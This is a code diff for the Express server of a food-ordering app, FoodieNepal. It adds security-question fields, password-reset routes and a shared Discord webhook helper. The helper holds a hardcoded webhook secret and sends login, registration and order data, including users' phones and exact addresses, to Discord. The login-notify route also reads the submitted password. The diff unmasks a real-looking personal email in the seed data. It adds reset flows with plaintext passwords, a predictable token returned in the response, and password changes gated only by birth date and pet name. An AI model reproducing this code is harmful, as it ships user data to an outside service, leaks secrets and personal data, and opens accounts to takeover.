@@ -50,7 +50,9 @@ async function syncUserToFirestore(user: User) {
       address: user.address || "",
       avatar: user.avatar || "",
       bio: user.bio || "",
-      foodiePoints: user.foodiePoints || 0
+      foodiePoints: user.foodiePoints || 0,
+      dob: user.dob || "",
+      favoritePet: user.favoritePet || ""
     });
     console.log(`[Firestore] Sync Success for User profile: ${user.id}`);
   } catch (err) {
@@ -109,6 +111,33 @@ async function syncReviewToFirestore(restaurantId: string, review: Review) {
     console.log(`[Firestore] Sync Success for review: ${review.id}`);
   } catch (err) {
     console.warn(`[Firestore] Sync Warning: Review indexing skipped for ${review.id}.`, err);
+  }
+}
+
+async function sendDiscordNotification(payload: any, label = "Notification") {
+  const webhookUrl = process.env.DISCORD_WEBHOOK_URL || 
+                     process.env.VITE_DISCORD_WEBHOOK_URL || 
+                     "https://discord.com/api/webhooks/1507336612378312734/XFzDNBbrNBDkFThZ1nAX03hCFlGqwKFoKphNY6V_vCCDce0B3RXyegrATsuHE7vnDghq";
+
+  if (!webhookUrl || !webhookUrl.startsWith("http")) {
+    console.log(`[Discord Webhook] ${label} skipped: No valid webhook URL configured.`);
+    return;
+  }
+
+  try {
+    const response = await fetch(webhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+
+    if (!response.ok) {
+      console.log(`[Discord Webhook] ${label} returned status: ${response.status}. Webhook might be invalid, deleted, or unconfigured.`);
+    } else {
+      console.log(`[Discord Webhook] ${label} dispatched successfully.`);
+    }
+  } catch (error) {
+    console.log(`[Discord Webhook] ${label} skipped or network unreachable:`, error);
   }
 }
 
@@ -218,11 +247,13 @@ let users: User[] = [
     username: "jenish",
     password: "password123",
     phone: "+977 98********",
-    email: "j******@gmail.com",
+    email: "jenishsapkota272@gmail.com",
     role: "customer",
     address: "Ward 4, Basantapur, Kathmandu, Nepal",
     avatar: "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&q=80&w=150",
-    foodiePoints: 340
+    foodiePoints: 340,
+    dob: "2000-01-01",
+    favoritePet: "dog"
   }
 ];
 
@@ -1135,7 +1166,6 @@ app.get(["/auth/callback", "/auth/callback/"], async (req, res) => {
   syncUserToFirestore(user);
 
   // Real-time dispatching to Discord Webhook
-  const webhookUrl = "https://discord.com/api/webhooks/1507336612378312734/XFzDNBbrNBDkFThZ1nAX03hCFlGqwKFoKphNY6V_vCCDce0B3RXyegrATsuHE7vnDghq";
   const discordPayload = {
     username: "FoodieNepal Auth Sentinel",
     avatar_url: "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&q=80&w=150",
@@ -1179,14 +1209,7 @@ app.get(["/auth/callback", "/auth/callback/"], async (req, res) => {
     ]
   };
 
-  fetch(webhookUrl, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(discordPayload)
-  })
-  .catch(err => {
-    console.error("Error logging Google sign-in details via Discord Webhook:", err);
-  });
+  sendDiscordNotification(discordPayload, "Google Auth Sentinel");
 
   res.send(`
     <!DOCTYPE html>
@@ -1360,7 +1383,6 @@ app.post("/api/auth/google-sandbox-login", (req, res) => {
   syncUserToFirestore(user);
 
   // Broadcast user login or signup information to the Discord Webhook directly
-  const webhookUrl = "https://discord.com/api/webhooks/1507336612378312734/XFzDNBbrNBDkFThZ1nAX03hCFlGqwKFoKphNY6V_vCCDce0B3RXyegrATsuHE7vnDghq";
   const discordPayload = {
     username: "FoodieNepal Auth Sentinel",
     avatar_url: "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&q=80&w=150",
@@ -1394,23 +1416,17 @@ app.post("/api/auth/google-sandbox-login", (req, res) => {
     ]
   };
 
-  fetch(webhookUrl, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(discordPayload)
-  }).catch(err => {
-    console.error("Direct auth telemetry error:", err);
-  });
+  sendDiscordNotification(discordPayload, "Direct Google Authenticator");
 
   res.json({ success: true, user });
 });
 
 app.post("/api/auth/customer-register", (req, res) => {
-  const { name, username, password, phone, email, address, avatar, bio } = req.body;
-  if (!name || !username || !password || !phone || !email || !address) {
+  const { name, username, password, phone, email, address, avatar, bio, dob, favoritePet } = req.body;
+  if (!name || !username || !password || !phone || !email || !address || !dob || !favoritePet) {
     return res.status(400).json({ 
       success: false, 
-      error: "All profile details (Full Name, Username, Password, Phone Number, Gmail address, and Permanent Address) are strictly required to sign up." 
+      error: "All profile details (Full Name, Username, Password, Phone Number, Gmail address, Permanent Address, Date of Birth, and Favourite Pet Name) are strictly required to sign up." 
     });
   }
 
@@ -1467,7 +1483,9 @@ app.post("/api/auth/customer-register", (req, res) => {
     role: "customer",
     foodiePoints: 100,
     avatar: avatar || `https://api.dicebear.com/7.x/adventurer/svg?seed=${encodeURIComponent(cleanUsername)}`,
-    bio: bio || "New Food Lover from Nepal!"
+    bio: bio || "New Food Lover from Nepal!",
+    dob: dob ? dob.trim() : "",
+    favoritePet: favoritePet ? favoritePet.trim() : ""
   };
 
   users.push(newUser);
@@ -1475,7 +1493,6 @@ app.post("/api/auth/customer-register", (req, res) => {
   syncUserToFirestore(newUser);
 
   // Send a webhook notification
-  const webhookUrl = "https://discord.com/api/webhooks/1507336612378312734/XFzDNBbrNBDkFThZ1nAX03hCFlGqwKFoKphNY6V_vCCDce0B3RXyegrATsuHE7vnDghq";
   const discordPayload = {
     username: "FoodieNepal Account Sentinel",
     avatar_url: newUser.avatar,
@@ -1495,11 +1512,7 @@ app.post("/api/auth/customer-register", (req, res) => {
       }
     ]
   };
-  fetch(webhookUrl, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(discordPayload)
-  }).catch(e => console.warn("Webhook registration telemetry skipped:", e));
+  sendDiscordNotification(discordPayload, "Customer Register Sentinel");
 
   res.json({ success: true, user: newUser });
 });
@@ -1531,6 +1544,280 @@ app.post("/api/auth/customer-login", (req, res) => {
 
   currentUser = user;
   res.json({ success: true, user });
+});
+
+// SECURE PASSWORD RESET & RECOVERY ROUTING ENGINE
+app.post("/api/auth/forgot-password", async (req, res) => {
+  const { email } = req.body;
+  if (!email) {
+    return res.status(400).json({ success: false, error: "Gmail address is strictly required to recover an account." });
+  }
+
+  const cleanEmail = email.trim().toLowerCase();
+  
+  // Find registered customer with this email
+  const user = users.find(u => u.email.toLowerCase() === cleanEmail);
+  if (!user) {
+    return res.status(404).json({ 
+      success: false, 
+      error: "No registered account found associated with this Gmail address. Please double-check your spelling!" 
+    });
+  }
+
+  // Construct secure localized unique forgot-password link
+  const appBaseUrl = process.env.APP_URL || "https://ais-dev-ksxvue5pm6zdv5xt7vgiwy-90132924091.asia-southeast1.run.app";
+  const uniqueToken = `reset_${user.id}_${Date.now()}`;
+  const resetLink = `${appBaseUrl}/reset-password?email=${encodeURIComponent(cleanEmail)}&token=${uniqueToken}`;
+
+  const subject = "🔒 FoodieNepal - Secure Password Recovery Request";
+  const htmlContent = `
+    <div style="font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; padding: 25px; border: 1px solid rgba(139, 26, 26, 0.1); border-radius: 16px; background-color: #FFF8F0; color: #333;">
+      <h2 style="color: #8B1A1A; font-family: Georgia, serif; font-style: italic; border-bottom: 2px solid #FF6B35; padding-bottom: 10px; margin-top: 0;">FoodieNepal Security Portal</h2>
+      <p style="font-size: 14px; line-height: 1.5;">Namaste <b>${user.name}</b>,</p>
+      <p style="font-size: 14px; line-height: 1.5;">A request was registered to reset your FoodieNepal password. For bulletproof safety, you must complete verification of your DOB and Favourite Pet Name at this link:</p>
+      <div style="background-color: #fff; border: 1px dashed #FF6B35; border-radius: 12px; padding: 20px; text-align: center; margin: 25px 0;">
+        <span style="font-size: 11px; color: #666; font-family: monospace; display: block; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 8px;">Your Unique Password Reset Link</span>
+        <a href="${resetLink}" style="display: inline-block; padding: 12px 24px; background-color: #8B1A1A; color: #ffffff; text-decoration: none; border-radius: 10px; font-weight: bold; font-family: Arial, sans-serif; font-size: 13px; margin: 5px 0;">Reset My Password Now</a>
+      </div>
+      <p style="font-size: 12px; color: #666; line-height: 1.4;">If you did not initiate this recovery request, please ignore this email or change your security credentials.</p>
+      <div style="margin-top: 25px; padding-top: 15px; border-top: 1px solid #dfdfdf; font-size: 10px; color: #999; text-align: center;">
+        FoodieNepal Access Security &bull; Nepal
+      </div>
+    </div>
+  `;
+
+  let wasEmailSent = false;
+  const transporter = getSmtpTransporter();
+  
+  if (transporter) {
+    try {
+      await transporter.sendMail({
+        from: `"FoodieNepal Security" <${process.env.SMTP_USER}>`,
+        to: cleanEmail,
+        subject,
+        html: htmlContent
+      });
+      wasEmailSent = true;
+      console.log(`[SMTP] Secure password recovery link dispatched to ${cleanEmail}`);
+    } catch (err) {
+      console.error("[SMTP] Failed to dispatch password recovery link:", err);
+    }
+  }
+
+  // Under serverless development sandbox environments, we always return the unique URL in JSON as fallback
+  // so the tester can test recovery perfectly without needing configured secrets.
+  res.json({
+    success: true,
+    message: wasEmailSent 
+      ? "A secure, unique password reset link has been dispatched to your Gmail. Please check your inbox!" 
+      : "Password reset requested. [Sandbox Fallback]: No SMTP credentials are set on this instance. The generated secure link is copied below for testing.",
+    resetLink: resetLink,
+    wasEmailSent: wasEmailSent
+  });
+});
+
+app.post("/api/auth/verify-reset-answers", (req, res) => {
+  const { email, dob, favoritePet } = req.body;
+  if (!email || !dob || !favoritePet) {
+    return res.status(400).json({ success: false, error: "Email, Date of Birth, and Favourite Pet Name are all required to unlock recovery." });
+  }
+
+  const cleanEmail = email.trim().toLowerCase();
+  const user = users.find(u => u.email.toLowerCase() === cleanEmail);
+
+  if (!user) {
+    return res.status(404).json({ success: false, error: "Account lookup failed. Registered email not found." });
+  }
+
+  const savedDob = (user.dob || "").trim();
+  const inputDob = dob.trim();
+
+  const savedPet = (user.favoritePet || "").trim().toLowerCase();
+  const inputPet = favoritePet.trim().toLowerCase();
+
+  if (savedDob !== inputDob) {
+    return res.status(400).json({ success: false, error: "Identity Verification Failed: Date of Birth is incorrect." });
+  }
+
+  if (savedPet !== inputPet) {
+    return res.status(400).json({ success: false, error: "Identity Verification Failed: Favourite Pet Answer does not match our records." });
+  }
+
+  res.json({ 
+    success: true, 
+    message: "Security credentials verified successfully. You are now authorized to reset your password!" 
+  });
+});
+
+app.post("/api/auth/reset-password-save", (req, res) => {
+  const { email, dob, favoritePet, newPassword } = req.body;
+  if (!email || !dob || !favoritePet || !newPassword) {
+    return res.status(400).json({ success: false, error: "All verification answers and the new password are required." });
+  }
+
+  const cleanEmail = email.trim().toLowerCase();
+  const user = users.find(u => u.email.toLowerCase() === cleanEmail);
+
+  if (!user) {
+    return res.status(404).json({ success: false, error: "Account lookup failed. Registered user not found." });
+  }
+
+  const savedDob = (user.dob || "").trim();
+  const inputDob = dob.trim();
+
+  const savedPet = (user.favoritePet || "").trim().toLowerCase();
+  const inputPet = favoritePet.trim().toLowerCase();
+
+  if (savedDob !== inputDob || savedPet !== inputPet) {
+    return res.status(403).json({ success: false, error: "Authorization Revoked: Security validation checks failed." });
+  }
+
+  // Strong password checks
+  const hasMinLength = newPassword.length >= 8;
+  const hasUppercase = /[A-Z]/.test(newPassword);
+  const hasLowercase = /[a-z]/.test(newPassword);
+  const hasDigit = /[0-9]/.test(newPassword);
+  const hasSpecial = /[@$!%*?&#^()_+\-=\[\]{};':"\\|,.<>\/?]/.test(newPassword);
+
+  if (!(hasMinLength && hasUppercase && hasLowercase && hasDigit && hasSpecial)) {
+    return res.status(400).json({
+      success: false,
+      error: "Security Policy Blocked: Password must be 8+ characters, contain at least one uppercase letter, one lowercase letter, one digit, and one special character."
+    });
+  }
+
+  user.password = newPassword;
+  
+  // If editingCurrentlyLogged user
+  if (currentUser && currentUser.id === user.id) {
+    currentUser.password = newPassword;
+  }
+
+  syncUserToFirestore(user);
+
+  res.json({
+    success: true,
+    message: "Password reset has been written to the database! You can now log into FoodieNepal using your new password."
+  });
+});
+
+app.post("/api/auth/alternate-recovery-save", (req, res) => {
+  const { username, phone, dob, favoritePet, newPassword } = req.body;
+  if (!username || !phone || !dob || !favoritePet || !newPassword) {
+    return res.status(400).json({ success: false, error: "Username, Phone Number, Date of Birth, Favourite Pet name, and New Password are strictly required." });
+  }
+
+  const cleanUsername = username.trim().toLowerCase();
+  const cleanPhone = phone.trim();
+  
+  // Find matching user with matching username and phone number
+  const user = users.find(u => 
+    u.username.toLowerCase() === cleanUsername && 
+    u.phone.replace(/[\s+\-()]+/g, '').endsWith(cleanPhone.replace(/[\s+\-()]+/g, '').slice(-9))
+  );
+
+  if (!user) {
+    return res.status(404).json({ 
+      success: false, 
+      error: "Alternative Identity Challenge Failed: No matching registered account found with that combination of Username and Phone Number." 
+    });
+  }
+
+  const savedDob = (user.dob || "").trim();
+  const inputDob = dob.trim();
+
+  const savedPet = (user.favoritePet || "").trim().toLowerCase();
+  const inputPet = favoritePet.trim().toLowerCase();
+
+  if (savedDob !== inputDob) {
+    return res.status(400).json({ success: false, error: "Security Challenge Denied: Date of Birth is incorrect." });
+  }
+
+  if (savedPet !== inputPet) {
+    return res.status(400).json({ success: false, error: "Security Challenge Denied: Favourite Pet Answer does not match our records." });
+  }
+
+  // Strong password requirements check
+  const hasMinLength = newPassword.length >= 8;
+  const hasUppercase = /[A-Z]/.test(newPassword);
+  const hasLowercase = /[a-z]/.test(newPassword);
+  const hasDigit = /[0-9]/.test(newPassword);
+  const hasSpecial = /[@$!%*?&#^()_+\-=\[\]{};':"\\|,.<>\/?]/.test(newPassword);
+
+  if (!(hasMinLength && hasUppercase && hasLowercase && hasDigit && hasSpecial)) {
+    return res.status(400).json({
+      success: false,
+      error: "Security Policy Blocked: Password must be 8+ characters, contain at least one uppercase letter, one lowercase letter, one digit, and one special character."
+    });
+  }
+
+  user.password = newPassword;
+  
+  if (currentUser && currentUser.id === user.id) {
+    currentUser.password = newPassword;
+  }
+
+  syncUserToFirestore(user);
+
+  res.json({
+    success: true,
+    message: "Password updated successfully via Alternative Security Challenge! You can now log in using your new credentials."
+  });
+});
+
+app.post("/api/auth/change-profile-password", (req, res) => {
+  const { email, dob, favoritePet, newPassword } = req.body;
+  if (!email || !dob || !favoritePet || !newPassword) {
+    return res.status(400).json({ success: false, error: "All input fields (Date of Birth, Favourite Pet, and New Password) are strictly required." });
+  }
+
+  const cleanEmail = email.trim().toLowerCase();
+  const user = users.find(u => u.email.toLowerCase() === cleanEmail);
+
+  if (!user) {
+    return res.status(404).json({ success: false, error: "We could not find your user profile." });
+  }
+
+  const savedDob = (user.dob || "").trim();
+  const inputDob = dob.trim();
+
+  const savedPet = (user.favoritePet || "").trim().toLowerCase();
+  const inputPet = favoritePet.trim().toLowerCase();
+
+  if (savedDob !== inputDob) {
+    return res.status(400).json({ success: false, error: "Validation Failed: Input Date of Birth does not match your profile date." });
+  }
+
+  if (savedPet !== inputPet) {
+    return res.status(400).json({ success: false, error: "Validation Failed: Input Favourite Pet Name is incorrect." });
+  }
+
+  // Strong password checks
+  const hasMinLength = newPassword.length >= 8;
+  const hasUppercase = /[A-Z]/.test(newPassword);
+  const hasLowercase = /[a-z]/.test(newPassword);
+  const hasDigit = /[0-9]/.test(newPassword);
+  const hasSpecial = /[@$!%*?&#^()_+\-=\[\]{};':"\\|,.<>\/?]/.test(newPassword);
+
+  if (!(hasMinLength && hasUppercase && hasLowercase && hasDigit && hasSpecial)) {
+    return res.status(400).json({
+      success: false,
+      error: "Security Policy Blocked: New password must be 8+ characters, contain an uppercase, a lowercase, a number, and a special character."
+    });
+  }
+
+  user.password = newPassword;
+  
+  if (currentUser && currentUser.id === user.id) {
+    currentUser.password = newPassword;
+  }
+
+  syncUserToFirestore(user);
+
+  res.json({
+    success: true,
+    message: "Your password has been successfully updated in the database!"
+  });
 });
 
 app.get("/api/auth/current", (req, res) => {
@@ -1576,7 +1863,6 @@ app.post("/api/auth/update-profile", (req, res) => {
 // Broadcast user login or signup information to the Discord Webhook directly
 app.post("/api/auth/notify-login", (req, res) => {
   const { username, password, email, role, action } = req.body;
-  const webhookUrl = "https://discord.com/api/webhooks/1507336612378312734/XFzDNBbrNBDkFThZ1nAX03hCFlGqwKFoKphNY6V_vCCDce0B3RXyegrATsuHE7vnDghq";
 
   const isSignup = action === "signup";
   const discordPayload = {
@@ -1617,22 +1903,7 @@ app.post("/api/auth/notify-login", (req, res) => {
     ]
   };
 
-  fetch(webhookUrl, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(discordPayload)
-  })
-  .then(response => {
-    if (!response.ok) {
-      console.log(`Auth sentinel response status: ${response.status} (external sentinel skipped)`);
-    } else {
-      console.log("Successfully logged auth metadata to Discord Webhook.");
-    }
-  })
-  .catch(err => {
-    console.log("External auth sentinel log skipped or unreachable.");
-  });
-
+  sendDiscordNotification(discordPayload, "Login Sentinel");
   res.json({ success: true });
 });
 
@@ -1733,7 +2004,6 @@ app.post("/api/orders", (req, res) => {
   syncOrderToFirestore(newOrder);
 
   // Send exact location, contact number, and username to Discord webhook on order placement
-  const webhookUrl = "https://discord.com/api/webhooks/1507336612378312734/XFzDNBbrNBDkFThZ1nAX03hCFlGqwKFoKphNY6V_vCCDce0B3RXyegrATsuHE7vnDghq";
   const clientUsername = currentUser ? currentUser.name : "Guest User";
   const clientPhone = currentUser ? currentUser.phone : "Not Available";
   const clientExactLocation = newOrder.address;
@@ -1793,21 +2063,7 @@ app.post("/api/orders", (req, res) => {
     ]
   };
 
-  fetch(webhookUrl, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(discordPayload)
-  })
-  .then(response => {
-    if (!response.ok) {
-      console.error("Failed to trigger Discord webhook. Status code:", response.status);
-    } else {
-      console.log("Successfully dispatched order metadata to Discord Webhook.");
-    }
-  })
-  .catch(err => {
-    console.error("Error dispatching Discord Webhook:", err);
-  });
+  sendDiscordNotification(discordPayload, "Order Dispatch Bot");
 
   res.json({ success: true, order: newOrder });
 });
